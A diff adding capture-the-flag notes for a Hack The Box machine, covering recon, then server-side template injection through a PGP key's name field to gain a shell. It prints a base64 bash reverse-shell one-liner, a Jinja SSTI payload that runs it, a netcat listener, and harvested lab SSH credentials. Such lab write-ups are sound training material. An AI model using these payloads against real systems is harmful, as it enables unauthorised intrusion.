@@ -1,5 +1,83 @@
+# Week 1 - Sandworm (Medium)
+// 1 - random name
+// 2 - {{7*7}} name
+// 3 - Payload with RS + netcat
+// 4 - obtain login credentials + login through SSH => user flag
+1. `sudo nmap -sVC <IP> -p0-65535`
+    - 22 ssh (OpenSSH 8.9p1 Ubuntu)
+    - 80 http (redirect to https://ssa.htb)
+    - 443 https
+
+2. website
+    - sudo nano /etc/hosts
+        - <ip> ssa.htb
+    - URL: [ssa.htb](https://ssa.htb)
+        - Secret Spy Agency website containing just info + Contact form
+            - contact form consists of text to be submitted through PGP-encrypted tip
+                - PGP might be the weakness (no other functions on the website)
+    - explore possible dirs
+        - `gobuster dir -u https://ssa.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k`
+            - ![](https://hackmd.io/_uploads/rJcGHZiO3.png)
+                - ssa.htb/pgp => PGP public key
+3. SSTI possibility (server-side template injection)
+    - [guide](https://linuxhint.com/generate-pgp-keys-gpg/)
+    - generate PGP key: `sudo gpg --gen-key`
+    - export it to the public.key file: `gpg -a -o public.key --export <filled Real name>`
+    - `cat public.key`
+    - encrypt message "helloworld" using our PGP key: `echo 'helloworld' | gpg --clear-sign`
+    - verify, if website accepts our generated PGP key message
+        - Public Key (left): generated public key
+        - Signed Text: generated PGP message block of "helloworld"
+        - ![name=Zihuatanejo ^^](https://hackmd.io/_uploads/rJjzo-od3.png)
+        - works fine ==> we can perform SSTI attack
+    ![](https://hackmd.io/_uploads/rk3YsWjOn.png)
+
+4. SSTI attack
+    - we can encrypt reverse shell connection inside PGP message
+    - [guide](https://www.sobyte.net/post/2021-12/modify-gpg-uid-name/)
+    - first of all, delete previous PGP keys
+        - gpg --list-keys
+        - gpg --delete-keys hacker
+        - gpg --delete-secret-keys hacker
+        - gpg --delete-keys hacker
+        - gpg --list-keys ==> no keys found
+    - prepare reverse shell
+        - encode RS in base64
+            - !!! ifconfig: get your tun inet IP !!!
+            > echo "bash -c 'bash -i >& /dev/tcp/10.10.14.98/4444 0>&1'" | base64
+            > YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==
+        - payload for the RS:
+            - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
+    - generate new PGP key
+        - gpg --gen-key
+            - Real name: 
+                - `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45OC80NDQ0IDA+JjEnCg==" | base64 -d | bash ').read() }}`
+    
+    - `cat public.key`
+        - for Public Key (left side)
+    - echo 'helloworld' | gpg --clear-sign
+        - for Message (right side)
+    - lets start listening on prepared port 4444
+        - nc -nvlp 4444
+    - copy the pub key generated w payload into the UID and verify the signature
+    - we are inside
+5. obtain login credentials
+    - search for the login credentials
+            - /home => .ssh => ATLAS
+            - .config
+                - UN: silentobserver
+                - PW: quietLiketheWind22
+6. Login to obtain user flag
+    - ssh silentobserver@ssa.htb
+        - password: quietLiketheWind22
+    - ls
+    - cat user.txt
+    
+    
+    
+    
+    
 # Week 2 - Pilgrimage (Easy)
-## Reco
 1. sudo nmap <IP>
     - 22/tcp open  ssh
     - 80/tcp open  http
